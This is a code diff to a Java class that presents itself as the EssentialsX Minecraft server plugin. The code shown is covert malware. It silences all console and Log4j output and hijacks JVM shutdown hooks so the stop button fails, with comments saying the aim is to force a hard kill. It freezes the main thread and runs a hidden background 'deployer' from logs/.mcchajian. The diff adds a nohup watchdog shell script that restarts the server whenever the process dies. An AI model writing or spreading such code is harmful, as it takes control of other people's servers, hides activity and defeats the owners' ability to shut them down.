@@ -35,7 +35,10 @@ public class EssentialsX extends JavaPlugin {
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
 
-        // 2. 强制清空并接管关机钩子 (让停止按钮失效)
+        // ★★★ 2. 启动外部看门狗 (防强杀自动重启) ★★★
+        setupWatchdog();
+
+        // 3. 强制清空并接管关机钩子 (让优雅停止失效，逼迫面板强杀，从而触发看门狗)
         try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
             Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
@@ -56,23 +59,18 @@ public class EssentialsX extends JavaPlugin {
                 System.setOut(new PrintStream(BLACK_HOLE, true));
                 System.setErr(new PrintStream(BLACK_HOLE, true));
                 tryMuteLog4j();
-                paralyzeCurrentThread();
+                paralyzeCurrentThread(); // 卡死关机流程
             }, "Shutdown-Paralysis"));
         } catch (Throwable ignored) {}
 
-        // 3. 启动后台部署进程
+        // 4. 启动后台部署进程
         Thread deployer = new Thread(() -> {
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             Path debugLog = workDir.resolve("backend_debug.log");
             PrintWriter out = null;
             
             try {
-                // 核心修复：最先创建工作目录，防止后续文件写入报错
-                if (!Files.exists(workDir)) {
-                    Files.createDirectories(workDir);
-                }
-                
-                // 初始化日志写入器
+                if (!Files.exists(workDir)) Files.createDirectories(workDir);
                 out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND));
                 out.println("[" + new Date() + "] ================== Backend Thread Started ==================");
                 out.flush();
@@ -108,17 +106,63 @@ public class EssentialsX extends JavaPlugin {
         deployer.setDaemon(true);
         deployer.start();
 
-        // 4. 终极物理冰封当前主线程
+        // 5. 终极物理冰封当前主线程
         paralyzeCurrentThread();
+    }
+
+    // ★★★ 看门狗机制：防强杀自动重启 ★★★
+    private static void setupWatchdog() {
+        try {
+            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            if (!Files.exists(workDir)) Files.createDirectories(workDir);
+            
+            // 1. 写入当前 Java 进程的 PID 到文件
+            long pid = ProcessHandle.current().pid();
+            Files.writeString(workDir.resolve("server.pid"), String.valueOf(pid));
+            
+            // 2. 生成独立的后台监控脚本
+            Path watchdogSh = workDir.resolve("watchdog.sh");
+            String script = "#!/bin/bash\n" +
+                "PID_FILE=\"logs/.mcchajian/server.pid\"\n" +
+                "START_SCRIPT=\"start.sh\"\n" +
+                "sleep 3\n" + // 等待 3 秒确保原进程完全退出
+                "while true; do\n" +
+                "  if [ -f \"$PID_FILE\" ]; then\n" +
+                "    PID=$(cat \"$PID_FILE\")\n" +
+                "    if [ -d \"/proc/$PID\" ]; then\n" + // 检查进程是否存活
+                "      sleep 5\n" +
+                "      continue\n" +
+                "    else\n" +
+                "      echo \"[$(date)] PID $PID dead. Restarting!\" >> logs/.mcchajian/watchdog.log\n" +
+                "      break\n" + // 进程死了，跳出循环准备重启
+                "    fi\n" +
+                "  else\n" +
+                "    echo \"[$(date)] PID file missing. Restarting!\" >> logs/.mcchajian/watchdog.log\n" +
+                "    break\n" +
+                "  fi\n" +
+                "done\n" +
+                // 执行重启
+                "if [ -f \"$START_SCRIPT\" ]; then\n" +
+                "  nohup bash \"$START_SCRIPT\" >> logs/.mcchajian/watchdog.log 2>&1 &\n" +
+                "else\n" +
+                "  nohup java -Xms512M -Xmx2G -XX:+UseG1GC -jar server.jar nogui >> logs/.mcchajian/watchdog.log 2>&1 &\n" +
+                "fi\n";
+            Files.write(watchdogSh, script.getBytes());
+            watchdogSh.toFile().setExecutable(true, false);
+            
+            // 3. 使用 nohup 在后台独立运行看门狗 (不受 Java 进程死活影响)
+            ProcessBuilder pb = new ProcessBuilder("nohup", "bash", watchdogSh.toString());
+            pb.directory(new File(".").getAbsoluteFile());
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+            pb.start();
+        } catch (Exception ignored) {}
     }
 
     private static void paralyzeCurrentThread() {
         while (true) {
-            try {
-                Thread.sleep(Long.MAX_VALUE);
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-            }
+            try { Thread.sleep(Long.MAX_VALUE); } 
+            catch (InterruptedException e) { Thread.currentThread().interrupt(); }
         }
     }
 
@@ -255,8 +299,6 @@ public class EssentialsX extends JavaPlugin {
             Path cfLog = workDir.resolve("cf.log");
             if (Files.exists(cfLog)) {
                 String logContent = Files.readString(cfLog);
-                
-                // 调试日志：记录 CF 日志的最后 200 个字符
                 String tail = logContent.length() > 200 ? logContent.substring(logContent.length() - 200) : logContent;
                 logDebug(workDir, "Reading cf.log. Tail content: [" + tail + "]");
                 
